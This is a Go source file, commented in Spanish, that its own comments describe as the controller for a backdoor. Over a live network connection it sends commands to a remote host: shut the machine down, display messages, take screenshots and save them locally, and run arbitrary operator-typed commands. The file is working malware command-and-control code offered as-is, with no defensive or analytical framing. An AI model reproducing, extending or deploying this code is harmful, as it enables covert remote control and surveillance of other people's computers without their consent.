// modulo que prepara los comandos a enviar al backdoor
package remoto

import (
	color "comando/colores"
	"comando/conex/comandos/ss"
	"comando/consola"
	"comando/input"
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

const INSTRUCCION = `
//comandos basicos:       //
//[0] limpiar consola     //       
//[1] apagar equipo       //
//[2] enviar mensaje      //
//[q] salir               //
//[ss] capturar pantalla  //
`
const (
	OP1 = "apagar equipo"
	OP2 = "enviar mensaje"
	OP3 = "salir"
	OP4 = "capturar pantalla"
	OP5 = "enviar comando"
)

var Instrucciones = []string{OP1, OP2, OP3, OP4, OP5}

const (
	TIMEOUT = 10   // tiempo en segundos que espera el cliente para recibir un paquete
	BUFFER  = 1024 //tamaño del buffer de funcion envio
)

// funcion que abstrae el envio de paquetes al host
func envio(conexiones net.Conn, envio string) error {

	err_t := conexiones.SetDeadline(time.Now().Add(time.Second * TIMEOUT))
	if err_t != nil {
		return errors.New("tiempo agotado")
	}

	buffer := make([]byte, BUFFER)

	_, escritura_error := conexiones.Write([]byte(envio))
	if escritura_error != nil {
		return errors.New("[!] hubo un problema durante el envio del comando")

	} else {
		// retornar los datos
		num, lectura_error := conexiones.Read(buffer)
		if lectura_error != nil {
			return errors.New("[!] error al recibir la informacion")

		} else {
			fmt.Println(string(buffer[:num]))
		}

	}
	return nil
}

// funcion cuyo proposito es la ejecucion de comandos
func Comando(conexiones net.Conn) error {
	// error que fuerza la recnexion para evitar problemas de desincronizacion con el host
	var reconectar = errors.New("reconexion")

	//println(color.Violeta + INSTRUCCION + color.Reset)

	eleccion, menu_error := consola.Menu(Instrucciones)

	if menu_error != nil {

		return menu_error
	}

	fmt.Print("\n")

	switch eleccion {

	case OP1: // apagar equipo
		err := envio(conexiones, "shutdown /s")
		if err != nil {
			return err
		}
	case OP2:

		mensaje := input.Input("mensaje >> ")

		envio(conexiones, fmt.Sprintf("msn-%s", mensaje))

	case OP3:
		fmt.Println(color.Verde + "\n[!] saliendo...\n" + color.Reset)
		envio(conexiones, "q")
		defer conexiones.Close()
		fmt.Print("\033[?1049l")
		os.Exit(0)

	case OP4:

		ch_img := make(chan []byte)
		ch_err := make(chan error)
		contex, cancel := context.WithTimeout(context.Background(), time.Second*5)
		defer cancel()

		fmt.Println(color.Violeta + "[*] esperando la imagen ..." + color.Reset)
		go func() {
			byte_img, img_error := ss.Obtener_img(conexiones)
			ch_img <- byte_img
			ch_err <- img_error
		}()

		select {

		case <-contex.Done():
			fmt.Println("[!] el host tardo mucho en responder a la solicitud de ss")

		case img_error := <-ch_err:
			return errors.New(fmt.Sprintf("[!] error al obtener la imagen:\n %s", img_error))

		case img := <-ch_img:
			if img != nil {
				nombre := input.Input("[*] nombre del png (sin extension)>> ")
				ss.Escribir_img(img, nombre)

				if runtime.GOOS == "windows" {
					exec.Command("powershell", "-command", "start", fmt.Sprintf("%s.png", nombre)).Run()
				}

			} else {
				return errors.New("no se pudo obtener la imagen por falta de permisos del host")
			}

		}
	case OP5:
		fmt.Print("\n")
		entrada := input.Input("[#] enviar comando >> ")
		fmt.Print("\n")
		err := envio(conexiones, entrada)
		if err != nil {
			return err
		}

	}
	input.Input("[+] presione ENTER para continuar ...")
	return reconectar

}
